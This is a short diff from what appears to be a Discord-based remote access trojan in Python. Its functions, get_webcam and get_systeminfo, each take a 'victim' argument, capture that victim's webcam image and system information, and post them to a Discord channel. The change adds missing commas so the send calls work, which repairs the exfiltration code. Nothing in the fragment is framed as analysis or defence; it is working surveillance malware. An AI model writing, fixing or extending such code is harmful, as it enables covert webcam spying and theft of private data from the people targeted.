@@ -128,7 +128,7 @@ async def get_webcam(ctx, victim):
         )
         
         await ctx.followup.send(
-            embed=genEmbed( "Image taken from webcam:", datetime.now() )
+            embed=genEmbed( "Image taken from webcam:", datetime.now() ),
             file=discord.File( nr_working + "\\image.png" )
         )
         time.sleep(2)
@@ -155,7 +155,7 @@ async def get_systeminfo(ctx, victim):
             stdin=subprocess.PIPE
         )
         await ctx.followup.send(
-            embed=genEmbed( "System Information:", datetime.now() )
+            embed=genEmbed( "System Information:", datetime.now() ),
             file=discord.File(nr_working + "\\youtube.txt", filename="systeminfo.txt"), 
         )
         time.sleep(2)
